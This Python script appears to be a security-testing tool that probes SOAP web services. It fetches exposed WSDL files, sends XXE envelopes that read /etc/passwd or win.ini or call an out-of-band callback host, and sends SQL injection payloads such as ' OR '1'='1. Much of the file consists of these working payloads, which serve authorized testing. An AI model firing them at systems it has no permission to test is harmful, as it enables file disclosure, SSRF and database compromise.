#!/usr/bin/env python
"""soap_probe.py — SOAP/WSDL testing (WSTG-CONF / WSTG-INPV), stdlib only.

SOAP/XML services (enterprise/legacy + many .NET/Java backends) are a prime surface the
kit didn't cover. Three high-value classes, all stdlib-feasible:

  WSDL EXPOSURE   fetch <endpoint>?wsdl (+ variants), parse it — a public WSDL leaks the
                  operation/parameter contract (info lead; the map for the rest).
  XXE via SOAP    SOAP stacks historically resolve external entities. Send an envelope
                  whose DOCTYPE pulls file:///etc/passwd (in-band) and an OOB-callback
                  entity; reflection of file content or an OOB hit = CONFIRMED (CWE-611).
                  Complements xxe_probe.py (which targets bare XML endpoints).
  SQLi via SOAP   inject into a string parameter of an operation; a SQL error signature
                  or boolean diff = a lead (CWE-89).

Each payload is baseline-diffed against a BENIGN envelope AND a malformed-envelope control
so a uniform 200/SOAP-fault or a non-SOAP catch-all cannot false-match (the kit's SPA/WAF-
shell guard, applied to SOAP). Per-operation results. ACTIVE (sends SOAP envelopes).

HONEST CEILINGS: WSDL schema resolution is pragmatic (operation names + the first input
param + targetNamespace + soap:address — not full XSD type walking). Services needing
WS-Security/custom headers that reject our requests emit a coverage_gap, not a false
"clean." For full gRPC/HTTP-2 API testing see the matrix (gRPC needs grpcurl/grpcio, out
of stdlib reach).

Usage:
  python soap_probe.py <endpoint-or-wsdl-url> [--operation name] [--param input]
        [--collab-host 127.0.0.1] [--collab-port 0] [--insecure] [--timeout 15]
"""
import sys, re, json, ssl, uuid, argparse, threading, urllib.request, urllib.error
import xml.etree.ElementTree as ET
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE
OOB_HITS = []
SQL_ERR = re.compile(r"\b(sql|syntax|mysql|oracle|odbc|jdbc|postgresql|sqlite|ORA-\d{4,}|microsoft (?:sql|ole db)|(?:mariadb|postgres))\b", re.I)
PASSWD = re.compile(r"root:x:0:|daemon:|nobody:|/bin/(?:ba)?sh|bin:x:", re.I)  # redact-allow: /etc/passwd detector regex, not a secret
WININI = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit", re.I)


def _local(tag):
    return tag.split("}", 1)[-1] if "}" in tag else tag


class _Collab(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        OOB_HITS.append(self.path)
        self.send_response(200); self.send_header("Content-Type", "text/plain"); self.end_headers()
        self.wfile.write(b"ok")


def _start_collab(port):
    srv = ThreadingHTTPServer(("127.0.0.1", port), _Collab)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]


def _get(url, timeout):
    try:
        with urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": UA}), timeout=timeout, context=_CTX) as r:
            return r.status, r.read(60000).decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, (e.read(60000).decode("latin-1", "replace") if hasattr(e, "read") else "")
    except Exception as e:
        return None, str(e)


def _post(endpoint, envelope, timeout):
    req = urllib.request.Request(endpoint, data=envelope.encode(),
                                headers={"User-Agent": UA, "Content-Type": "text/xml; charset=utf-8",
                                         "SOAPAction": '""'})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_CTX) as r:
            return r.status, r.read(60000).decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, (e.read(60000).decode("latin-1", "replace") if hasattr(e, "read") else "")
    except Exception as e:
        return None, str(e)


def discover_wsdl(url, timeout):
    """Try ?wsdl variants; return {found, wsdl_url, operations, tns, endpoint, params}."""
    candidates = []
    if re.search(r"\?wsdl\b", url, re.I):
        candidates = [url]
    else:
        base = url.split("?")[0]
        candidates = [base + "?wsdl", base + "?WSDL", base + "/?wsdl", base + "?wsdl=1"]
    for c in candidates:
        st, body = _get(c, timeout)
        if st and st < 400 and body and ("<wsdl:" in body or "<definitions" in body or "xmlns:wsdl" in body):
            return parse_wsdl(c, body)
    return {"found": False, "tried": candidates}


def parse_wsdl(wsdl_url, body):
    info = {"found": True, "wsdl_url": wsdl_url, "operations": [], "tns": "", "endpoint": "", "params": []}
    try:
        root = ET.fromstring(body.encode("utf-8", "replace"))
    except Exception as e:
        info["parse_error"] = str(e)
        return info
    info["tns"] = root.get("targetNamespace", "")
    # operations live under portType
    ops = []
    for pt in root.iter():
        if _local(pt.tag) == "portType":
            for op in pt:
                if _local(op.tag) == "operation" and op.get("name"):
                    ops.append(op.get("name"))
    info["operations"] = ops[:30]
    # endpoint (soap:address location)
    for el in root.iter():
        if _local(el.tag) == "address" and el.get("location"):
            info["endpoint"] = el.get("location"); break
    # rough param names from the schema element declarations
    params = []
    for el in root.iter():
        if _local(el.tag) == "element" and el.get("name"):
            params.append(el.get("name"))
    info["params"] = list(dict.fromkeys(params))[:40]
    return info


def _envelope(tns, operation, param, value, doctype=""):
    dt = doctype or ""
    tns_attr = f' xmlns:tns="{tns}"' if tns else ""
    return (f'<?xml version="1.0"?>\n{dt}'
            f'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"{tns_attr}>'
            f"<soapenv:Body><tns:{operation if tns else operation}>"
            f"<{param}>{value}</{param}>"
            f"</tns:{operation if tns else operation}></soapenv:Body></soapenv:Envelope>")


def test_operation(endpoint, tns, operation, param, collab_url, timeout):
    """Send benign / malformed-control / XXE / SQLi envelopes; baseline-diff."""
    benign = _envelope(tns, operation, param, "redan")
    malformed = _envelope(tns, operation, param, "redan")  # then break it
    malformed = malformed.replace(f"</{param}>", "", 1)  # unclosed -> well-formedness error
    sb, bb = _post(endpoint, benign, timeout)
    sm, bm = _post(endpoint, malformed, timeout)
    # if malformed is accepted exactly like benign, the endpoint isn't really parsing SOAP
    parses = not (sb == sm and bb == bm and sb and sb < 400)

    out = {"operation": operation, "param": param, "baseline_status": sb,
           "malformed_status": sm, "endpoint_parses": parses, "tests": [], "findings": []}

    # --- XXE: in-band /etc/passwd + win.ini, + OOB callback ---
    xxe_in = ('<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>', "&x;")
    xxe_win = ('<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///c:/windows/win.ini"> ]>', "&x;")
    for name, (dt, val) in (("xxe-passwd", xxe_in), ("xxe-winini", xxe_win)):
        s, b = _post(endpoint, _envelope(tns, operation, param, val, dt), timeout)
        hit = (PASSWD.search(b) if name == "xxe-passwd" else WININI.search(b))
        confirmed = bool(hit and not PASSWD.search(bb) and not WININI.search(bb))
        out["tests"].append({"id": name, "status": s, "confirmed": confirmed,
                             "body_snippet": (b or "")[:140].replace("\n", " ")})
        if confirmed:
            out["findings"].append({"id": "soap-xxe", "severity": "high",
                                    "detail": f"SOAP operation '{operation}' resolves external entities — {name} file content reflected (CWE-611). Confirm reach to sensitive files / SSRF via entity."})
    if collab_url:
        token = uuid.uuid4().hex[:12]
        dt = f'<!DOCTYPE r [ <!ENTITY x SYSTEM "{collab_url}/soap-xxe-{token}"> ]>'
        _post(endpoint, _envelope(tns, operation, param, "&x;", dt), timeout)
        # give the callback a moment
        import time
        time.sleep(0.4)
        oob_hit = any(f"soap-xxe-{token}" in h for h in OOB_HITS)
        out["tests"].append({"id": "xxe-oob", "collab": collab_url, "callback": oob_hit})
        if oob_hit:
            out["findings"].append({"id": "soap-xxe-oob", "severity": "high",
                                    "detail": f"SOAP operation '{operation}' made an out-of-band callback resolving an external entity (CWE-611) — blind XXE; chain to file exfil/SSRF."})

    # --- SQLi: error-based + boolean ---
    s_err, b_err = _post(endpoint, _envelope(tns, operation, param, "redan'\""), timeout)
    err_hit = bool(SQL_ERR.search(b_err) and not SQL_ERR.search(bb))
    out["tests"].append({"id": "sqli-error", "status": s_err, "confirmed": err_hit,
                         "body_snippet": (b_err or "")[:140].replace("\n", " ")})
    if err_hit:
        out["findings"].append({"id": "soap-sqli", "severity": "high",
                                "detail": f"SOAP operation '{operation}' param '{param}' returned a SQL error on a quote — SQL injection surface (CWE-89). Confirm boolean/time-based."})
    # boolean: benign 'redan' vs always-true
    s_bool, b_bool = _post(endpoint, _envelope(tns, operation, param, "redan' OR '1'='1"), timeout)
    bool_diff = (sb == s_bool and abs(len(b_bool) - len(bb)) > 50 and b_bool != bb and parses)
    out["tests"].append({"id": "sqli-boolean", "status": s_bool, "lead": bool_diff})
    if bool_diff:
        out["findings"].append({"id": "soap-sqli-boolean-lead", "severity": "medium",
                                "detail": f"SOAP operation '{operation}' param '{param}' — always-true payload changed the response vs benign (boolean SQLi LEAD; confirm)."})
    return out


def run(target, operation, param, collab_host, collab_port, timeout, verify):
    out = {"target": target, "ok": True, "wsdl": {}, "operations_tested": [], "findings": []}
    findings = []

    wsdl = discover_wsdl(target, timeout)
    out["wsdl"] = wsdl
    if wsdl.get("found"):
        findings.append({"id": "wsdl-exposed", "severity": "info",
                         "detail": f"WSDL is publicly reachable at {wsdl['wsdl_url']} — exposes {len(wsdl.get('operations', []))} operation(s) and the parameter contract (info disclosure; the map for deeper testing).",
                         "operations": wsdl.get("operations", [])[:20]})
    # endpoint to POST envelopes to
    endpoint = wsdl.get("endpoint") or (target.split("?")[0] if wsdl.get("found") else target)
    tns = wsdl.get("tns", "")
    operations = ([operation] if operation else wsdl.get("operations", []))[:5]
    use_param = param or (wsdl.get("params", ["input"])[0] if wsdl.get("params") else "input")

    if not operations:
        out["coverage_gap"] = True
        out["coverage_gap_reason"] = ("No operation discovered (no WSDL found / WSDL unreadable / no --operation given). "
                                      "Re-run with --operation <name> --param <name> against a known SOAP endpoint.")
        out["findings"] = findings
        out["note"] = ("SOAP tester. Provide a WSDL-bearing URL or --operation/--param. ACTIVE (sends SOAP envelopes). "
                       "WSDL schema resolution is pragmatic; WS-Security-gated services may need custom headers.")
        return out

    collab_url = None
    if collab_host:
        _, port = _start_collab(collab_port)
        collab_url = f"http://{collab_host}:{port}"

    for op in operations:
        res = test_operation(endpoint, tns, op, use_param, collab_url, timeout)
        out["operations_tested"].append(res)
        findings.extend(res["findings"])

    out["findings"] = findings
    out["note"] = ("SOAP tester (WSDL discovery + XXE + SQLi, baseline + malformed-control guarded). ACTIVE. "
                   "XXE OOB needs --collab-host reachable from the target; on a JS-challenge WAF re-test via the browser.")
    return out


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="SOAP/WSDL tester (WSDL exposure + XXE + SQLi)")
    ap.add_argument("url", help="SOAP endpoint or WSDL URL")
    ap.add_argument("--operation", help="specific operation to test (else first 5 from WSDL)")
    ap.add_argument("--param", default=None, help="parameter name to inject into (else first from WSDL)")
    ap.add_argument("--collab-host", default=None, help="OOB callback host reachable from the target (enables blind XXE)")
    ap.add_argument("--collab-port", type=int, default=0)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--insecure", action="store_true")
    a = ap.parse_args()
    print(json.dumps(run(a.url, a.operation, a.param, a.collab_host, a.collab_port, a.timeout, not a.insecure), indent=2))
